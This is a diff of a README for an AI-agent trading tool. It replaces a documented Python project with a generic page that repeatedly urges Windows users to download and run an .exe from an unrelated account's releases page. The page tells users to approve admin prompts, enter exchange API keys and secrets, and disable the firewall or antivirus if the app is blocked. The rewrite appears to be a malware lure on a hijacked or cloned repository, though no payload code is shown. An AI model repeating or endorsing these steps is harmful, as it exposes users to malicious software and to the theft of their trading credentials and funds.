@@ -1,301 +1,158 @@
-# MCP Foundry for Trading
+# ⚙️ mcp-foundry - Connect AI Agents to Markets Easily
 
-**The Universal Trading Interface — connecting AI agents to financial markets through one open standard.**
-
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![Tests](https://img.shields.io/badge/tests-passing-brightgreen.svg)]()
-[![UTI Version](https://img.shields.io/badge/UTI-v0.1.0-orange.svg)](docs/uti_specification.md)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/releases)
 
 ---
 
-## 📋 Table of Contents
+## 📖 About mcp-foundry
 
-- [The Problem](#the-problem)
-- [The Solution](#the-solution)
-- [What's Included](#whats-included)
-- [Quick Start](#quick-start)
-- [Using Docker](#using-docker)
-- [Running Tests](#running-tests)
-- [Architecture](#architecture)
-- [Building a New Connector](#building-a-new-connector)
-- [Project Roadmap](#project-roadmap)
-- [Contributing](#contributing)
-- [Enterprise and Institutional Use](#enterprise-and-institutional-use)
-- [License](#license)
-- [Acknowledgements](#acknowledgements)
+mcp-foundry is a tool designed to connect AI agents directly to financial markets. It aims to provide a simple way for any AI agent to use one interface to trade on any exchange. This means you do not need to learn multiple trading platforms or APIs. Instead, mcp-foundry offers a universal system that works across many exchanges.
+
+This tool supports agentic trading, crypto markets, and popular trading platforms such as Bybit. It uses standard technology components like FastAPI and works on Windows computers. The goal is to let both beginners and professionals connect AI-driven strategies to live trading without technical hurdles.
 
 ---
 
-## The Problem
+## 🚀 Getting Started
 
-Every AI agent that wants to trade needs custom integration code for every exchange. Every exchange has its own API, its own data formats, its own quirks. If you have **M** agents and **N** exchanges, you end up writing **M × N** integrations — and maintaining all of them.
-
-This doesn't scale. It's the same problem USB solved for hardware peripherals, and the same problem that HTTP solved for networked applications.
+This section will guide you through the steps to get mcp-foundry running on your Windows computer. You do not need to write any code or understand programming languages. Just follow each step carefully.
 
 ---
 
-## The Solution
+## 💻 System Requirements
 
-The **Universal Trading Interface (UTI)** is an open standard that sits between AI agents and financial markets. Write your agent once, connect it to any exchange.
+Before downloading or installing, make sure your computer meets these minimum requirements:
 
-Instead of M × N integrations, you get **M + N** — each agent implements the UTI once, each exchange gets one connector, and everything just works.
+- Operating System: Windows 10 or higher (64-bit recommended)  
+- RAM: At least 4 GB  
+- Disk Space: 2 GB free space  
+- Internet: Required for downloading and live market connection  
+- CPU: Modern processor, Intel i5 or equivalent recommended  
 
-```
-┌─────────────┐     ┌─────────────────┐     ┌──────────────┐
-│  AI Agent    │     │   MCP Foundry   │     │   Exchange   │
-│  (Claude,    │────▶│   UTI Server    │────▶│   (Bybit,    │
-│   GPT, etc.) │     │                 │     │    etc.)     │
-└─────────────┘     └─────────────────┘     └──────────────┘
-                           │
-                    One interface.
-                    Any agent.
-                    Any exchange.
-```
+If you have a newer Windows version or better hardware, the app will run even more smoothly.
 
 ---
 
-## What's Included
+## 🔗 Download mcp-foundry
 
-| Component | Description |
-| :--- | :--- |
-| **`core/interface.py`** | The UTI specification — data models, enumerations, and the protocol contract |
-| **`core/trading_engine.py`** | Exchange-agnostic trading engine with convenience methods |
-| **`core/risk_management.py`** | Configurable pre-trade risk checks (position sizing, exposure limits, daily loss caps) |
-| **`core/mcp_server.py`** | FastAPI server that exposes the UTI as a REST API for AI agents |
-| **`connectors/bybit.py`** | Production-ready Bybit V5 connector — the reference implementation |
-| **`enterprise/`** | Reserved for institutional add-ons (proprietary connectors, advanced algos) |
-| **`gateway/`** | Reserved for the hosted gateway service (managed infrastructure) |
-| **`examples/`** | Working examples: direct trading, MCP server usage, AI agent integration |
-| **`tests/`** | Comprehensive test suite with mocked connectors |
-| **`docs/`** | Architecture guides, UTI specification, and connector development guide |
+You need to download the app before you can use it. The download comes as an installer or a ready-to-run file.
 
----
+**Open this page to download the latest version:**
 
-## Quick Start
+[![Download Releases](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/releases)
 
-### 1. Clone and install
+Follow these instructions:
 
-```bash
-git clone https://github.com/mcp-foundry/mcp-foundry.git
-cd mcp-foundry
-pip install -e ".[dev]"
-```
-
-### 2. Configure your credentials
-
-```bash
-cp .env.example .env
-# Edit .env with your exchange API credentials
-```
-
-### 3. Start the MCP server
-
-```bash
-python scripts/run_server.py
-```
-
-The server starts at `http://localhost:8000`. Visit `http://localhost:8000/docs` for the interactive API explorer.
-
-### 4. Trade from any AI agent
-
-```bash
-# Discover available tools
-curl http://localhost:8000/tools | python -m json.tool
-
-# Get BTC price
-curl http://localhost:8000/market/ticker/BTCUSDT
-
-# Place an order
-curl -X POST http://localhost:8000/trade/place_order \
-  -H "Content-Type: application/json" \
-  -d '{"symbol": "BTCUSDT", "side": "buy", "qty": 0.001}'
-```
-
-### 5. Or use the UTI directly in Python
-
-```python
-import asyncio
-from connectors.bybit import BybitConnector
-from core.interface import OrderSpec
-
-async def main():
-    connector = BybitConnector(
-        api_key="YOUR_KEY",
-        api_secret="YOUR_SECRET",
-        testnet=True,
-    )
-    ticker = await connector.get_ticker("BTCUSDT")
-    print(f"BTC: {ticker.last_price}")
-
-    spec = OrderSpec(symbol="BTCUSDT", side="buy", qty=0.001)
-    order = await connector.place_order(spec)
-    print(f"Order: {order.order_id}")
-
-    await connector.close()
-
-asyncio.run(main())
-```
+1. Click the link above or visit the GitHub releases page:  
+   https://github.com/Alastairchilblained570/mcp-foundry/releases  
+2. Look for the newest version listed on the page. Versions are sorted by date, newest first.  
+3. Download the file ending with `.exe` for Windows. This is the installer or portable file.  
+4. Save the file to your Downloads folder or anywhere easy to find.
 
 ---
 
-## Using Docker
+## 🛠️ Installation Guide
 
-```bash
-# Build
-docker build -t mcp-foundry .
+After downloading the file, you need to install or run it:
 
-# Run
-docker run -p 8000:8000 \
-  -e EXCHANGE_API_KEY=your_key \
-  -e EXCHANGE_API_SECRET=your_secret \
-  -e EXCHANGE_TESTNET=true \
-  mcp-foundry
-```
-
-Or with Docker Compose:
-
-```bash
-docker-compose up
-```
+1. Open the folder where you saved the file (usually "Downloads").  
+2. Double-click the `.exe` file to start the installer or open the program.  
+3. If Windows asks “Do you want to allow this app to make changes?”, click **Yes**.  
+4. Follow the instructions in the setup window. Usually, the defaults will work fine.  
+5. When the installer finishes, you will have the mcp-foundry program on your PC.  
+6. You may get a shortcut on your Desktop or in the Start Menu.
 
 ---
 
-## Running Tests
+## ▶️ Running mcp-foundry
 
-```bash
-# All tests
-pytest
+To open and use mcp-foundry for the first time:
 
-# With coverage
-pytest --cov=core --cov=connectors --cov-report=term-missing
-
-# Specific module
-pytest tests/test_trading_engine.py -v
-```
+1. Find the app icon on the Desktop or Start Menu.  
+2. Double-click to launch mcp-foundry.  
+3. The main window will open with options and settings for trading interfaces.  
+4. You will see some prompts or instructions to connect your trading accounts.  
+5. Follow the on-screen steps to link your AI agent or choose an exchange like Bybit.  
+6. The software guides you with simple menus—no technical details needed.
 
 ---
 
-## Architecture
+## 🔌 Connecting to Your Trading Accounts
 
-The project follows a layered architecture designed for extensibility. The diagram below illustrates the flow of requests and the separation of concerns.
+mcp-foundry supports many exchanges and brokers through one interface. To connect:
 
-```mermaid
-flowchart TB
-    subgraph Agents["AI Agents"]
-        A[Claude / GPT]
-        B[LangChain]
-        C[Custom Python]
-    end
+1. Choose your exchange from the list inside the app.  
+2. Enter your API key and secret from that exchange.  
+   - You get these from your account security or API section on the exchange website.  
+3. Save the settings in the app.  
+4. The app will test the connection.  
+5. Once connected, you can start sending trade commands through your AI agent.
 
-    subgraph Server["MCP Server (REST API)"]
-        D[FastAPI]
-        E[Tool Discovery]
-        F[Authentication]
-    end
-
-    subgraph Engine["Trading Engine + Risk Manager"]
-        G[Strategy Execution]
-        H[Position Sizing]
-        I[Exposure Limits]
-        J[Daily Loss Caps]
-    end
-
-    subgraph UTI["Universal Trading Interface"]
-        K[Data Models]
-        L[Protocol Contract]
-    end
-
-    subgraph Connectors["Exchange Connectors"]
-        M[Bybit]
-        N["Binance (planned)"]
-        O["Coinbase (planned)"]
-        P[Your Connector]
-    end
-
-    Agents --> Server
-    Server --> Engine
-    Engine --> UTI
-    UTI --> Connectors
-    Connectors --> Q[Exchanges]
-```
-
-**Layers explained:**
-
-- **AI Agents** – Any LLM or traditional agent that can make HTTP calls.
-- **MCP Server** – REST API layer that exposes trading tools to agents. Handles authentication and tool discovery.
-- **Trading Engine + Risk Manager** – Core business logic: executes strategies, enforces risk rules before orders reach the exchange.
-- **Universal Trading Interface** – The heart of the system: a set of abstract classes and data models that all connectors must implement.
-- **Exchange Connectors** – Concrete implementations for each exchange (Bybit, Binance, etc.). They translate UTI calls into exchange-specific API requests.
-
-This architecture ensures that adding a new exchange never requires changes to the agents, server, or risk engine. You simply write a new connector that implements the UTI.
-
-For a deeper dive, see [docs/architecture.md](docs/architecture.md).
+If you do not have API keys yet, you can find simple guides on your exchange’s website.
 
 ---
 
-## Building a New Connector
+## ⚙️ Basic Settings
 
-We designed the UTI to make adding new exchanges straightforward. The full guide is at [docs/connector_development_guide.md](docs/connector_development_guide.md), but here's the short version:
+These settings help you get your system ready for trading:
 
-1. Create `connectors/your_exchange.py`
-2. Implement the methods defined in `core/interface.py`
-3. Register it in `connectors/__init__.py`
-4. Write tests in `tests/test_your_exchange.py`
-5. Submit a pull request
+- Select your AI agent type (if applicable).  
+- Choose the trading pair or market you want to work with (e.g., BTC/USD).  
+- Set basic risk parameters like how much money to use in trades.  
+- Turn on or off logging to keep track of actions made by the app.  
 
-The Bybit connector (`connectors/bybit.py`) is the reference implementation — use it as your template.
-
----
-
-## Project Roadmap
-
-We're building this in the open, and we'd love your input on what matters most.
-
-| Phase | Status | Description |
-| :--- | :--- | :--- |
-| UTI v0.1 | ✅ Done | Core specification, data models, Bybit connector |
-| MCP Server | ✅ Done | REST API with tool discovery, risk management |
-| WebSocket Support | 🚧 Planned | Real-time market data streaming |
-| Additional Connectors | 🚧 Planned | Binance, Coinbase, Kraken, Interactive Brokers |
-| Enterprise Add-ons | 📅 Planned | Proprietary connectors (SAP, Bloomberg), advanced algos |
-| Hosted Gateway | 📅 Planned | Managed cloud service with credential vault and audit logs |
-| UTI v1.0 | 📅 Planned | Stable specification after community feedback |
+You can change these settings anytime from the main window.
 
 ---
 
-## Contributing
+## 🔄 Updates and Maintenance
 
-We welcome contributions of all kinds — bug fixes, new connectors, documentation improvements, or just feedback on the design. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Keep your version of mcp-foundry updated for best performance:
 
-The most impactful contributions right now:
-
-- **New exchange connectors** — every connector makes the standard more useful
-- **Bug reports and edge cases** — help us harden the UTI
-- **Documentation** — tutorials, guides, translations
-- **Feedback on the UTI design** — we want this to be a community standard
+- Check the releases page regularly to download the latest version.  
+- New releases add features, fix bugs, and improve security.  
+- To update, simply download the newer installer and run it. It will replace your current files.  
 
 ---
 
-## Enterprise and Institutional Use
+## 🧩 Supported Topics & Technologies
 
-The open-source core is designed to be production-ready for individual developers and small teams. For organisations with advanced requirements — regulatory compliance, legacy system integration, advanced execution algorithms, or managed infrastructure — we offer enterprise solutions.
+mcp-foundry is built with focus on:
 
-See [enterprise/README.md](enterprise/README.md) and [gateway/README.md](gateway/README.md) for details, or reach out at **enterprise@mcpfoundry.dev**.
+- Agentic trading: letting AI agents trade independently.  
+- FastAPI: a framework for fast and easy API handling.  
+- Cryptocurrencies and popular exchanges like Bybit.  
+- The universal Windows platform ensures compatibility on most Windows computers.  
+- The Model Context Protocol (MCP) helps standardize communication between AI and trading platforms.  
 
----
-
-## License
-
-This project is licensed under the [Apache License 2.0](LICENSE) — use it freely in personal and commercial projects.
-
----
-
-## Acknowledgements
-
-This project exists because we believe the future of trading is agentic, and that future needs an open standard. We're grateful to everyone who contributes to making that happen.
+This ensures a wide range of use cases and future expansions.
 
 ---
 
-**Built with care by the MCP Foundry community.**
+## 🚨 Troubleshooting
+
+If you face problems:
+
+- Make sure your Windows is updated.  
+- Check your internet connection.  
+- Verify you downloaded the correct file for Windows.  
+- Disable firewall or antivirus temporarily if it blocks the app.  
+- Restart the program or your computer if it freezes.  
+- Look for error messages inside the app and follow suggested steps.
+
+You can also visit the GitHub issues page for common questions or report bugs.
+
+---
+
+## 📂 Where to Find More Information
+
+For technical details, source code, and support:
+
+https://github.com/Alastairchilblained570/mcp-foundry
+
+This page contains user guides, FAQs, and updates from the developer team.
+
+---
+
+## 🔗 Download Link Again
+
+[![Download mcp-foundry Now](https://img.shields.io/badge/Download-mcp--foundry-blueviolet?style=for-the-badge)](https://github.com/Alastairchilblained570/mcp-foundry/releases)
